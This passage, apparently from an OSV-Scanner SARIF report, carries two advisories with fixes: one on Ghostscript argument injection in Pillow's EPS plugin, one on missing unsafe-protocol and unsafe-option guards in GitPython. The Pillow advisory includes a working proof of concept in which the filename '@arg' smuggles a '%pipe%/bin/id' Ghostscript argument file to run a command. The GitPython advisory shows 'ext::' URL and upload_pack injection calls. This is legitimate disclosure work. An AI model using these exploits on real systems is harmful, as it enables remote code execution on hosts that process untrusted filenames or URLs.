                "markdown": "**Your dependency is vulnerable to [CVE-2026-112900](https://osv.dev/CVE-2026-112900)**.\n\n## [GHSA-w889-685w-c8fh](https://osv.dev/GHSA-w889-685w-c8fh)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e `PIL.EpsImagePlugin.Ghostscript()` builds the Ghostscript command line using the input file path (`fp.name`) **without sanitization**, placing it at `-f \u003cinfile\u003e`. A filename beginning with `-` is interpreted by Ghostscript as an option, giving command-line argument injection; chainable to RCE (see Impact). Reproduces with Pillow's default invocation (with `-dSAFER` enabled).\n\u003e \n\u003e ### Details\n\u003e _Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\n\u003e \n\u003e #### Type\n\u003e CWE-88 (Argument Injection) (→ CWE-78 (OS Command Injection) optionally, with attacker controlled text file)\n\u003e \n\u003e #### Vulnerable Codes\n\u003e \n\u003e ```python\n\u003e infile_temp = None\n\u003e if hasattr(fp, \"name\") and os.path.exists(fp.name):\n\u003e     infile = fp.name                      # user-controlled path used as-is, without validation\n\u003e else:\n\u003e     in_fd, infile_temp = tempfile.mkstemp()\n\u003e     os.close(in_fd)\n\u003e     infile = infile_temp\n\u003e     # ... (copy fp into a temporary file)\n\u003e \n\u003e # Build Ghostscript command\n\u003e command = [\n\u003e     gs_binary,\n\u003e     \"-q\",\n\u003e     f\"-g{width:d}x{height:d}\",\n\u003e     f\"-r{res_x:f}x{res_y:f}\",\n\u003e     \"-dBATCH\",\n\u003e     \"-dNOPAUSE\",\n\u003e     \"-dSAFER\",                            # default sandbox — does NOT stop this injection\n\u003e     f\"-sDEVICE={device}\",\n\u003e     f\"-sOutputFile={outfile}\",\n\u003e     \"-c\",\n\u003e     f\"{-bbox[0]} {-bbox[1]} translate\",\n\u003e     \"-f\",\n\u003e     infile,                               # injected here: inserted into argv with no check for\n\u003e                                           # option prefixes (-, --) or Ghostscript's @-file token\n\u003e                                           # =\u003e argument injection (CWE-88)\n\u003e     \"-c\",\n\u003e     \"showpage\",\n\u003e ]\n\u003e # ...\n\u003e subprocess.check_call(command, startupinfo=startupinfo)   # spawns Ghostscript\n\u003e ```\n\u003e \n\u003e #### Root cause. \n\u003e \n\u003e When rendering an EPS image, PIL.EpsImagePlugin.Ghostscript() constructs the Ghostscript command line using the input file path (fp.name) and places it directly at the -f \u003cinfile\u003e position of the argument list. This path is user-controllable, yet Pillow performs no validation or neutralization of tokens that Ghostscript treats specially during command-line argument parsing — in particular a leading - or -- (which Ghostscript interprets as an option rather than a filename) and a leading @ (Ghostscript's argument-file syntax, which causes it to read additional command-line arguments from the named file). Because the filename is neither normalized (e.g., forced to an absolute path or prefixed with ./) nor checked against these prefixes before being handed to the subprocess, an attacker who controls the filename passed to Image.open() can inject arbitrary Ghostscript command-line arguments. This is a classic argument-injection flaw (CWE-88), and it is not mitigated by Pillow's default -dSAFER setting.\n\u003e \n\u003e #### Affected\n\u003e - Pillow: tested on 12.3.0 (latest); vulnerable code is long-standing and appears to affect all current versions (main included).\n\u003e - Component: `src/PIL/EpsImagePlugin.py`, `Ghostscript()` — `infile = fp.name`, and the command list entry `\"-f\", infile`.\n\u003e \n\u003e #### Suggested fix\n\u003e Normalize the filename to an absolute path before it is passed to Ghostscript, so it can never be parsed as an option (`-`/`--`) or as an argument-file token (`@`):\n\u003e ```python\n\u003e     if hasattr(fp, \"name\") and os.path.exists(fp.name):\n\u003e         infile = os.path.abspath(fp.name)   # was: infile = fp.name\n\u003e ```\n\u003e `os.path.abspath()` guarantees the path starts with a path separator (or a drive letter on Windows), so a leading `-` or `@` can no longer reach Ghostscript's argument parser. The `else` branch already builds a safe `tempfile.mkstemp()` path and needs no change.\n\u003e \n\u003e ### PoC\n\u003e dockerfile, Default run shows the argument-injection demo (poc.py); for the RCE PoC run python3 poc-rce.py.\n\u003e ```\n\u003e FROM ubuntu:24.04\n\u003e \n\u003e RUN apt update\n\u003e RUN apt install -y --no-install-recommends python3 python3-venv ghostscript ca-certificates\n\u003e RUN rm -rf /var/lib/apt/lists/*\n\u003e RUN python3 -m venv /venv \u0026\u0026 /venv/bin/pip install --upgrade pip Pillow==12.3.0\n\u003e ENV PATH=/venv/bin:$PATH\n\u003e WORKDIR /poc\n\u003e COPY poc.py .\n\u003e COPY poc-rce.py .\n\u003e COPY arg .\n\u003e \n\u003e CMD [\"python3\", \"poc.py\"]\n\u003e ```\n\u003e poc.py\n\u003e ```\n\u003e import os\n\u003e from PIL import Image\n\u003e \n\u003e ############################################################################################\n\u003e # Attacker controlled file\n\u003e ############################################################################################\n\u003e \n\u003e EPS = b\"%!PS-Adobe-3.0 EPSF-3.0\\n%%BoundingBox: 0 0 100 100\\n%%EndComments\\nshowpage\\n\"\n\u003e \n\u003e name = \"-h\"\n\u003e with open(name, \"wb\") as f:\n\u003e     f.write(EPS)\n\u003e \n\u003e ############################################################################################\n\u003e \n\u003e print(f\"[*] Pillow opens a file whose name is {name!r}\")\n\u003e im = Image.open(name)\n\u003e print(f\"[*] call `load()`; this paths calls `gs` command with '-f {name}'\")\n\u003e try:\n\u003e     im.load()\n\u003e except Exception as e:\n\u003e     print(f\"[*] load() raised: {type(e).__name__}: {e}\")\n\u003e \n\u003e print(\"CWE-88: argument injection; Pillow code doesn't validate argument name\")\n\u003e print(\"        This poc.py shows the vulnerability clearly.\")\n\u003e print(\"        If Pillow checks the name of file before it uses, It won't display `help`\")\n\u003e ```\n\u003e poc-rce.py\n\u003e ```\n\u003e import os\n\u003e from PIL import Image\n\u003e \n\u003e ############################################################################################\n\u003e # Attacker controlled file\n\u003e ############################################################################################\n\u003e \n\u003e EPS = b\"%!PS-Adobe-3.0 EPSF-3.0\\n%%BoundingBox: 0 0 100 100\\n%%EndComments\\nshowpage\\n\"\n\u003e \n\u003e # To chain this vulnerability into critical RCE, We need another arbitrary text file\n\u003e # In this script, it is `arg`.\n\u003e name = \"@arg\"\n\u003e with open(name, \"wb\") as f:\n\u003e     f.write(EPS)\n\u003e \n\u003e ############################################################################################\n\u003e \n\u003e print(f\"[*] Pillow opens a file whose name is {name!r}\")\n\u003e im = Image.open(name)\n\u003e print(f\"[*] call `load()`; this paths calls `gs` command with '-f {name}'\")\n\u003e print(f\"[*] and this leads to arbitrary command injection.\")\n\u003e print(f\"*********************************************\")\n\u003e try:\n\u003e     im.load()\n\u003e except Exception as e:\n\u003e     print(f\"*********************************************\")\n\u003e     print(f\"[*] load() raised: {type(e).__name__}: {e}\")\n\u003e \n\u003e print(\"\")\n\u003e print(\"CWE-78: OS Command Injection;\")\n\u003e print(\"CWE-88: Argument Injection  ; Pillow code doesn't validate argument name\")\n\u003e print(\"        This poc.py shows the vulnerability clearly.\")\n\u003e print(\"        If Pillow checks the name of file before it uses, It won't call `id`\")\n\u003e ```\n\u003e arg\n\u003e ```\n\u003e -sOutputFile=%pipe%/bin/id\n\u003e -c\n\u003e 1\n\u003e dict\n\u003e dup\n\u003e /OutputFile\n\u003e (%pipe%/bin/id)\n\u003e put\n\u003e setpagedevice\n\u003e ```\n\u003e \n\u003e ### Impact\n\u003e **Confirmed — Ghostscript argument injection.** Because the filename is not validated, a leading `-`/`--` is parsed by Ghostscript as an option rather than a file. An attacker who controls the filename passed to `Image.open()` can therefore inject a Ghostscript command-line argument. Single-argument injection always succeeds.\n\u003e \n\u003e **Potential RCE (verified).** The filename is also not validated against Ghostscript's `@`-file syntax: a filename of the form `@\u003cpath\u003e` causes Ghostscript to read additional command-line arguments from `\u003cpath\u003e`, allowing multiple arguments to be injected at once. If the attacker can additionally control the referenced file, this can be escalated to arbitrary command execution — an escalation we verified in our PoC (execution of `id`).\n\u003e \n\u003e Applies under Pillow's default configuration (with `-dSAFER` enabled), on Pillow 12.3.0 with Ghostscript 10.02.1. With same GS arguments, I also confirmed RCE with latest GS version (10.07.1)\n\u003e \n\u003e ### Why this is a Pillow bug (not the documented \"block untrusted EPS\" risk)\n\u003e This is not the malicious-EPS-content risk described in Pillow's security policy: the flaw is triggered by the filename, not by anything in the PostScript document. A completely benign EPS file still results in Ghostscript argument injection whenever the filename passed to Image.open() is attacker-influenced, so applications that legitimately process EPS remain affected — the guidance to block untrusted EPS input does not cover this.\n\u003e Because Pillow is the component that constructs the Ghostscript command line, ensuring a filename cannot be reinterpreted as an option (-/--) or an argument-file token (@) is Pillow's responsibility, not that of every downstream caller. The precondition — attacker influence over a filename that reaches Image.open() — is realistic (e.g., file-upload endpoints that preserve or derive the stored name from user input), and chaining it with this flaw yields RCE in practice, not just in theory. A one-line normalization (os.path.abspath(fp.name)) closes it without any change to how applications use the API.\n\u003e \n\u003e ### Author\n\u003e Chanu Kang (from CysecLab at KAIST) @HLe4s\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-w889-685w-c8fh | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112900\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n",
                "text": "**Your dependency is vulnerable to [CVE-2026-112900](https://osv.dev/CVE-2026-112900)**.\n\n## [GHSA-w889-685w-c8fh](https://osv.dev/GHSA-w889-685w-c8fh)\n\n\u003cdetails\u003e\n\u003csummary\u003eDetails\u003c/summary\u003e\n\n\u003e ### Summary\n\u003e `PIL.EpsImagePlugin.Ghostscript()` builds the Ghostscript command line using the input file path (`fp.name`) **without sanitization**, placing it at `-f \u003cinfile\u003e`. A filename beginning with `-` is interpreted by Ghostscript as an option, giving command-line argument injection; chainable to RCE (see Impact). Reproduces with Pillow's default invocation (with `-dSAFER` enabled).\n\u003e \n\u003e ### Details\n\u003e _Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._\n\u003e \n\u003e #### Type\n\u003e CWE-88 (Argument Injection) (→ CWE-78 (OS Command Injection) optionally, with attacker controlled text file)\n\u003e \n\u003e #### Vulnerable Codes\n\u003e \n\u003e ```python\n\u003e infile_temp = None\n\u003e if hasattr(fp, \"name\") and os.path.exists(fp.name):\n\u003e     infile = fp.name                      # user-controlled path used as-is, without validation\n\u003e else:\n\u003e     in_fd, infile_temp = tempfile.mkstemp()\n\u003e     os.close(in_fd)\n\u003e     infile = infile_temp\n\u003e     # ... (copy fp into a temporary file)\n\u003e \n\u003e # Build Ghostscript command\n\u003e command = [\n\u003e     gs_binary,\n\u003e     \"-q\",\n\u003e     f\"-g{width:d}x{height:d}\",\n\u003e     f\"-r{res_x:f}x{res_y:f}\",\n\u003e     \"-dBATCH\",\n\u003e     \"-dNOPAUSE\",\n\u003e     \"-dSAFER\",                            # default sandbox — does NOT stop this injection\n\u003e     f\"-sDEVICE={device}\",\n\u003e     f\"-sOutputFile={outfile}\",\n\u003e     \"-c\",\n\u003e     f\"{-bbox[0]} {-bbox[1]} translate\",\n\u003e     \"-f\",\n\u003e     infile,                               # injected here: inserted into argv with no check for\n\u003e                                           # option prefixes (-, --) or Ghostscript's @-file token\n\u003e                                           # =\u003e argument injection (CWE-88)\n\u003e     \"-c\",\n\u003e     \"showpage\",\n\u003e ]\n\u003e # ...\n\u003e subprocess.check_call(command, startupinfo=startupinfo)   # spawns Ghostscript\n\u003e ```\n\u003e \n\u003e #### Root cause. \n\u003e \n\u003e When rendering an EPS image, PIL.EpsImagePlugin.Ghostscript() constructs the Ghostscript command line using the input file path (fp.name) and places it directly at the -f \u003cinfile\u003e position of the argument list. This path is user-controllable, yet Pillow performs no validation or neutralization of tokens that Ghostscript treats specially during command-line argument parsing — in particular a leading - or -- (which Ghostscript interprets as an option rather than a filename) and a leading @ (Ghostscript's argument-file syntax, which causes it to read additional command-line arguments from the named file). Because the filename is neither normalized (e.g., forced to an absolute path or prefixed with ./) nor checked against these prefixes before being handed to the subprocess, an attacker who controls the filename passed to Image.open() can inject arbitrary Ghostscript command-line arguments. This is a classic argument-injection flaw (CWE-88), and it is not mitigated by Pillow's default -dSAFER setting.\n\u003e \n\u003e #### Affected\n\u003e - Pillow: tested on 12.3.0 (latest); vulnerable code is long-standing and appears to affect all current versions (main included).\n\u003e - Component: `src/PIL/EpsImagePlugin.py`, `Ghostscript()` — `infile = fp.name`, and the command list entry `\"-f\", infile`.\n\u003e \n\u003e #### Suggested fix\n\u003e Normalize the filename to an absolute path before it is passed to Ghostscript, so it can never be parsed as an option (`-`/`--`) or as an argument-file token (`@`):\n\u003e ```python\n\u003e     if hasattr(fp, \"name\") and os.path.exists(fp.name):\n\u003e         infile = os.path.abspath(fp.name)   # was: infile = fp.name\n\u003e ```\n\u003e `os.path.abspath()` guarantees the path starts with a path separator (or a drive letter on Windows), so a leading `-` or `@` can no longer reach Ghostscript's argument parser. The `else` branch already builds a safe `tempfile.mkstemp()` path and needs no change.\n\u003e \n\u003e ### PoC\n\u003e dockerfile, Default run shows the argument-injection demo (poc.py); for the RCE PoC run python3 poc-rce.py.\n\u003e ```\n\u003e FROM ubuntu:24.04\n\u003e \n\u003e RUN apt update\n\u003e RUN apt install -y --no-install-recommends python3 python3-venv ghostscript ca-certificates\n\u003e RUN rm -rf /var/lib/apt/lists/*\n\u003e RUN python3 -m venv /venv \u0026\u0026 /venv/bin/pip install --upgrade pip Pillow==12.3.0\n\u003e ENV PATH=/venv/bin:$PATH\n\u003e WORKDIR /poc\n\u003e COPY poc.py .\n\u003e COPY poc-rce.py .\n\u003e COPY arg .\n\u003e \n\u003e CMD [\"python3\", \"poc.py\"]\n\u003e ```\n\u003e poc.py\n\u003e ```\n\u003e import os\n\u003e from PIL import Image\n\u003e \n\u003e ############################################################################################\n\u003e # Attacker controlled file\n\u003e ############################################################################################\n\u003e \n\u003e EPS = b\"%!PS-Adobe-3.0 EPSF-3.0\\n%%BoundingBox: 0 0 100 100\\n%%EndComments\\nshowpage\\n\"\n\u003e \n\u003e name = \"-h\"\n\u003e with open(name, \"wb\") as f:\n\u003e     f.write(EPS)\n\u003e \n\u003e ############################################################################################\n\u003e \n\u003e print(f\"[*] Pillow opens a file whose name is {name!r}\")\n\u003e im = Image.open(name)\n\u003e print(f\"[*] call `load()`; this paths calls `gs` command with '-f {name}'\")\n\u003e try:\n\u003e     im.load()\n\u003e except Exception as e:\n\u003e     print(f\"[*] load() raised: {type(e).__name__}: {e}\")\n\u003e \n\u003e print(\"CWE-88: argument injection; Pillow code doesn't validate argument name\")\n\u003e print(\"        This poc.py shows the vulnerability clearly.\")\n\u003e print(\"        If Pillow checks the name of file before it uses, It won't display `help`\")\n\u003e ```\n\u003e poc-rce.py\n\u003e ```\n\u003e import os\n\u003e from PIL import Image\n\u003e \n\u003e ############################################################################################\n\u003e # Attacker controlled file\n\u003e ############################################################################################\n\u003e \n\u003e EPS = b\"%!PS-Adobe-3.0 EPSF-3.0\\n%%BoundingBox: 0 0 100 100\\n%%EndComments\\nshowpage\\n\"\n\u003e \n\u003e # To chain this vulnerability into critical RCE, We need another arbitrary text file\n\u003e # In this script, it is `arg`.\n\u003e name = \"@arg\"\n\u003e with open(name, \"wb\") as f:\n\u003e     f.write(EPS)\n\u003e \n\u003e ############################################################################################\n\u003e \n\u003e print(f\"[*] Pillow opens a file whose name is {name!r}\")\n\u003e im = Image.open(name)\n\u003e print(f\"[*] call `load()`; this paths calls `gs` command with '-f {name}'\")\n\u003e print(f\"[*] and this leads to arbitrary command injection.\")\n\u003e print(f\"*********************************************\")\n\u003e try:\n\u003e     im.load()\n\u003e except Exception as e:\n\u003e     print(f\"*********************************************\")\n\u003e     print(f\"[*] load() raised: {type(e).__name__}: {e}\")\n\u003e \n\u003e print(\"\")\n\u003e print(\"CWE-78: OS Command Injection;\")\n\u003e print(\"CWE-88: Argument Injection  ; Pillow code doesn't validate argument name\")\n\u003e print(\"        This poc.py shows the vulnerability clearly.\")\n\u003e print(\"        If Pillow checks the name of file before it uses, It won't call `id`\")\n\u003e ```\n\u003e arg\n\u003e ```\n\u003e -sOutputFile=%pipe%/bin/id\n\u003e -c\n\u003e 1\n\u003e dict\n\u003e dup\n\u003e /OutputFile\n\u003e (%pipe%/bin/id)\n\u003e put\n\u003e setpagedevice\n\u003e ```\n\u003e \n\u003e ### Impact\n\u003e **Confirmed — Ghostscript argument injection.** Because the filename is not validated, a leading `-`/`--` is parsed by Ghostscript as an option rather than a file. An attacker who controls the filename passed to `Image.open()` can therefore inject a Ghostscript command-line argument. Single-argument injection always succeeds.\n\u003e \n\u003e **Potential RCE (verified).** The filename is also not validated against Ghostscript's `@`-file syntax: a filename of the form `@\u003cpath\u003e` causes Ghostscript to read additional command-line arguments from `\u003cpath\u003e`, allowing multiple arguments to be injected at once. If the attacker can additionally control the referenced file, this can be escalated to arbitrary command execution — an escalation we verified in our PoC (execution of `id`).\n\u003e \n\u003e Applies under Pillow's default configuration (with `-dSAFER` enabled), on Pillow 12.3.0 with Ghostscript 10.02.1. With same GS arguments, I also confirmed RCE with latest GS version (10.07.1)\n\u003e \n\u003e ### Why this is a Pillow bug (not the documented \"block untrusted EPS\" risk)\n\u003e This is not the malicious-EPS-content risk described in Pillow's security policy: the flaw is triggered by the filename, not by anything in the PostScript document. A completely benign EPS file still results in Ghostscript argument injection whenever the filename passed to Image.open() is attacker-influenced, so applications that legitimately process EPS remain affected — the guidance to block untrusted EPS input does not cover this.\n\u003e Because Pillow is the component that constructs the Ghostscript command line, ensuring a filename cannot be reinterpreted as an option (-/--) or an argument-file token (@) is Pillow's responsibility, not that of every downstream caller. The precondition — attacker influence over a filename that reaches Image.open() — is realistic (e.g., file-upload endpoints that preserve or derive the stored name from user input), and chaining it with this flaw yields RCE in practice, not just in theory. A one-line normalization (os.path.abspath(fp.name)) closes it without any change to how applications use the API.\n\u003e \n\u003e ### Author\n\u003e Chanu Kang (from CysecLab at KAIST) @HLe4s\n\n\u003c/details\u003e\n\n---\n\n### Affected Packages\n\n| Source | Package Name | Package Version |\n| --- | --- | --- |\n| lockfile:/home/runner/work/empathy/empathy/egolint/uv.lock | pillow | 12.3.0 |\n\n## Remediation\n\nTo fix these vulnerabilities, update the vulnerabilities past the listed fixed versions below.\n\n### Fixed Versions\n\n| Vulnerability ID | Package Name | Fixed Version |\n| --- | --- | --- |\n| GHSA-w889-685w-c8fh | pillow | 13.0.0 |\n\nIf you believe these vulnerabilities do not affect your code and wish to ignore them, add them to the ignore list in an\n`osv-scanner.toml` file located in the same directory as the lockfile containing the vulnerable dependency.\n\nSee the format and more options in our documentation here: https://google.github.io/osv-scanner/configuration/\n\nAdd or append these values to the following config files to ignore this vulnerability:\n\n`/home/runner/work/empathy/empathy/egolint/osv-scanner.toml`\n\n```\n[[IgnoredVulns]]\nid = \"CVE-2026-112900\"\nreason = \"Your reason for ignoring this vulnerability\"\n```\n"
              },
              "id": "CVE-2026-112900",
              "name": "CVE-2026-112900",
              "properties": {
                "security-severity": "9.2"
              },
              "relationships": [],
              "shortDescription": {
                "markdown": "CVE-2026-112900: Pillow: Argument Injection in Ghostscript call, potentially leading into RCE",
                "text": "CVE-2026-112900: Pillow: Argument Injection in Ghostscript call, potentially leading into RCE"
              }
            },
            {
              "deprecatedIds": [
                "CVE-2026-110857",
                "GHSA-w8jc-g24h-crhw"
              ],
              "fullDescription": {
                "markdown": "### Summary\n\nGitPython has spent 2022-2026 rolling out two reusable guards method-by-method: `Git.check_unsafe_protocols(url)` (raises `UnsafeProtocolError` for `\u003ctransport\u003e::` remote-helper URLs - CVE-2022-24439) and `Git.check_unsafe_options(...)` (raises `UnsafeOptionError` for denylisted option spellings - CVE-2023-40267, CVE-2026-42215, CVE-2026-67323). Three wrapper methods that build a `git` argv from caller-controlled values still have **neither**:\n\n1. **`Git.ls_remote`** (git/cmd.py:1128-1143) - checks options (:1139-1141) but forwards the URL positional unchecked; no `allow_unsafe_protocols` parameter exists. The same URL through `clone_from` raises `UnsafeProtocolError`.\n2. **`Repo.merge_base`** (git/repo/base.py:895-936) - forwards `**kwargs`/`*rev` to `self.git.merge_base` with no guard; guarded sibling `iter_commits` sits 12 lines up. Its exception handler additionally swallows every non-128 `GitCommandError` into `[]`, masking the injection.\n3. **`IndexFile.move`** (git/index/base.py:1092-1168) - forwards `**kwargs` to `git mv` twice (:1147, :1167); guarded sibling `remove()` is 23 lines above.\n\nVerified unfixed on `main @ a54d159` (2026-09-21), post-dating latest release 3.1.62 (2026-09-07) - all three sites re-verified today.\n\n### Impact\n\n**Site 1 (`ls_remote`)** - RCE conditional on the victim git transport policy. The common 'probe first, then clone' pattern (`Git(...).ls_remote(attacker_url)`) with an `ext::sh -c ...` URL executes arbitrary commands when the victim git permits the ext transport: dynamically verified with `protocol.ext.allow=always` (marker executed). git \u003e= 2.38.1 stock config refuses the transport (`fatal: transport 'ext' not allowed`, rc 128) - GitPython adds no defense-in-depth and surfaces a bare `GitCommandError`. Environments on git \u003c 2.38.1 are exposed with stock config - the exact population CVE-2022-24439 was scored against.\n\n**Sites 2/3** - latent argument-injection surface: caller kwargs flow 1:1 into the `git` argv before operands and `--` (cmd.py:1850 `opt_args + ext_args`), and `execute_kwargs` (incl. `shell=True`/`env` - the CVE-2023-40267 Windows mechanism) passes through unguarded. Today `git merge-base`/`git mv` expose no exec option, so we claim the missing-guard class (vendor-settled by CVE-2026-67323, which bundled archive/ls_remote/iter_commits/blame in one advisory), not direct RCE.\n\n### Dynamic verification (today; GitPython main @ a54d159, git 2.55.0, Linux)\n\n| # | Call | Result |\n|---|---|---|\n| T1 | `repo.git.ls_remote('ext::/tmp/gp_touch.sh')`, stock config | git refuses (rc 128); **no `UnsafeProtocolError` from GitPython** |\n| T1b | same + victim config `protocol.ext.allow=always` | **marker created - arbitrary command executed** |\n| T2 | `repo.git.ls_remote('.', upload_pack=...)` | blocked by cmd.py:1141 (options-side fixed - protocol-side is the residual gap) |\n| T3 | `repo.merge_base('main','side', upload_pack=...)` | **not blocked**; argv `git merge-base --upload-pack=... main side`; rc 129 silently converted to `[]` |\n| T4 | `repo.index.move(['f1','f2'], output=...)` | **not blocked**; option reaches `git mv` (rc 129) |\n\n### Coverage matrix (main @ a54d159)\n\n`check_unsafe_protocols`: 7 call sites (`_clone`, `archive`, `set_url`, `create`, `fetch`, `pull`, `push`) - none on `ls_remote`.\n`check_unsafe_options`: 24 call sites incl. `ls_remote`, `iter_commits`, `IndexFile.remove` - absent on `merge_base` and `move`.\n\n### Precedents (same repo, same guard family)\n\n- **CVE-2022-24439 / GHSA-hcpj-qp55-gfph** (critical): `check_unsafe_protocols` on the clone path - Site 1 is the same `ext::` primitive on a sibling API.\n- **CVE-2023-40267 / GHSA-pr76-5cm5-w9cj** (critical, 'incomplete fix for CVE-2022-24439'): `check_unsafe_options` - unguarded kwargs to argv treated as RCE (`shell=True` on Windows).\n- **CVE-2026-42215 / GHSA-rpm5-65cw-6hj4** (high, fixed 3.1.47): underscored-spelling bypass - rollout still active in 2026.\n- **CVE-2026-67323 / GHSA-956x-8gvw-wg5v** (high, 8.4, fixed 3.1.51): added `check_unsafe_options` to `archive`/`ls_remote`/`iter_commits`/`blame`; its PoC is literally `repo.git.ls_remote('.', upload_pack=...)`. Establishes that a wrapper missing the check is itself a vulnerability. This report is the residual gap of that rollout: `ls_remote` got options but not protocols; `merge_base`/`move` got neither.\n\n### Recommended fix (existing helpers, 1-3 lines per site)\n\n1. `Git.ls_remote`: `if not allow_unsafe_protocols: self.check_unsafe_protocols(args[0])` + new `allow_unsafe_protocols: bool = False` (the `_clone` pattern, base.py:1536-1538).\n2. `Repo.merge_base`: `check_unsafe_options(Git._option_candidates(list(rev), kwargs), unsafe_options=self.unsafe_git_revision_options)` (the `iter_commits` pattern); stop masking non-128 statuses.\n3. `IndexFile.move`: the `remove()` pattern with `unsafe_git_pathspec_from_file_options`.\n\nOne advisory, three affected methods, severity anchored on Site 1 - mirroring CVE-2026-67323's bundling.",
                "text": "### Summary\n\nGitPython has spent 2022-2026 rolling out two reusable guards method-by-method: `Git.check_unsafe_protocols(url)` (raises `UnsafeProtocolError` for `\u003ctransport\u003e::` remote-helper URLs - CVE-2022-24439) and `Git.check_unsafe_options(...)` (raises `UnsafeOptionError` for denylisted option spellings - CVE-2023-40267, CVE-2026-42215, CVE-2026-67323). Three wrapper methods that build a `git` argv from caller-controlled values still have **neither**:\n\n1. **`Git.ls_remote`** (git/cmd.py:1128-1143) - checks options (:1139-1141) but forwards the URL positional unchecked; no `allow_unsafe_protocols` parameter exists. The same URL through `clone_from` raises `UnsafeProtocolError`.\n2. **`Repo.merge_base`** (git/repo/base.py:895-936) - forwards `**kwargs`/`*rev` to `self.git.merge_base` with no guard; guarded sibling `iter_commits` sits 12 lines up. Its exception handler additionally swallows every non-128 `GitCommandError` into `[]`, masking the injection.\n3. **`IndexFile.move`** (git/index/base.py:1092-1168) - forwards `**kwargs` to `git mv` twice (:1147, :1167); guarded sibling `remove()` is 23 lines above.\n\nVerified unfixed on `main @ a54d159` (2026-09-21), post-dating latest release 3.1.62 (2026-09-07) - all three sites re-verified today.\n\n### Impact\n\n**Site 1 (`ls_remote`)** - RCE conditional on the victim git transport policy. The common 'probe first, then clone' pattern (`Git(...).ls_remote(attacker_url)`) with an `ext::sh -c ...` URL executes arbitrary commands when the victim git permits the ext transport: dynamically verified with `protocol.ext.allow=always` (marker executed). git \u003e= 2.38.1 stock config refuses the transport (`fatal: transport 'ext' not allowed`, rc 128) - GitPython adds no defense-in-depth and surfaces a bare `GitCommandError`. Environments on git \u003c 2.38.1 are exposed with stock config - the exact population CVE-2022-24439 was scored against.\n\n**Sites 2/3** - latent argument-injection surface: caller kwargs flow 1:1 into the `git` argv before operands and `--` (cmd.py:1850 `opt_args + ext_args`), and `execute_kwargs` (incl. `shell=True`/`env` - the CVE-2023-40267 Windows mechanism) passes through unguarded. Today `git merge-base`/`git mv` expose no exec option, so we claim the missing-guard class (vendor-settled by CVE-2026-67323, which bundled archive/ls_remote/iter_commits/blame in one advisory), not direct RCE.\n\n### Dynamic verification (today; GitPython main @ a54d159, git 2.55.0, Linux)\n\n| # | Call | Result |\n|---|---|---|\n| T1 | `repo.git.ls_remote('ext::/tmp/gp_touch.sh')`, stock config | git refuses (rc 128); **no `UnsafeProtocolError` from GitPython** |\n| T1b | same + victim config `protocol.ext.allow=always` | **marker created - arbitrary command executed** |\n| T2 | `repo.git.ls_remote('.', upload_pack=...)` | blocked by cmd.py:1141 (options-side fixed - protocol-side is the residual gap) |\n| T3 | `repo.merge_base('main','side', upload_pack=...)` | **not blocked**; argv `git merge-base --upload-pack=... main side`; rc 129 silently converted to `[]` |\n| T4 | `repo.index.move(['f1','f2'], output=...)` | **not blocked**; option reaches `git mv` (rc 129) |\n\n### Coverage matrix (main @ a54d159)\n\n`check_unsafe_protocols`: 7 call sites (`_clone`, `archive`, `set_url`, `create`, `fetch`, `pull`, `push`) - none on `ls_remote`.\n`check_unsafe_options`: 24 call sites incl. `ls_remote`, `iter_commits`, `IndexFile.remove` - absent on `merge_base` and `move`.\n\n### Precedents (same repo, same guard family)\n\n- **CVE-2022-24439 / GHSA-hcpj-qp55-gfph** (critical): `check_unsafe_protocols` on the clone path - Site 1 is the same `ext::` primitive on a sibling API.\n- **CVE-2023-40267 / GHSA-pr76-5cm5-w9cj** (critical, 'incomplete fix for CVE-2022-24439'): `check_unsafe_options` - unguarded kwargs to argv treated as RCE (`shell=True` on Windows).\n- **CVE-2026-42215 / GHSA-rpm5-65cw-6hj4** (high, fixed 3.1.47): underscored-spelling bypass - rollout still active in 2026.\n- **CVE-2026-67323 / GHSA-956x-8gvw-wg5v** (high, 8.4, fixed 3.1.51): added `check_unsafe_options` to `archive`/`ls_remote`/`iter_commits`/`blame`; its PoC is literally `repo.git.ls_remote('.', upload_pack=...)`. Establishes that a wrapper missing the check is itself a vulnerability. This report is the residual gap of that rollout: `ls_remote` got options but not protocols; `merge_base`/`move` got neither.\n\n### Recommended fix (existing helpers, 1-3 lines per site)\n\n1. `Git.ls_remote`: `if not allow_unsafe_protocols: self.check_unsafe_protocols(args[0])` + new `allow_unsafe_protocols: bool = False` (the `_clone` pattern, base.py:1536-1538).\n2. `Repo.merge_base`: `check_unsafe_options(Git._option_candidates(list(rev), kwargs), unsafe_options=self.unsafe_git_revision_options)` (the `iter_commits` pattern); stop masking non-128 statuses.\n3. `IndexFile.move`: the `remove()` pattern with `unsafe_git_pathspec_from_file_options`.\n\nOne advisory, three affected methods, severity anchored on Site 1 - mirroring CVE-2026-67323's bundling."
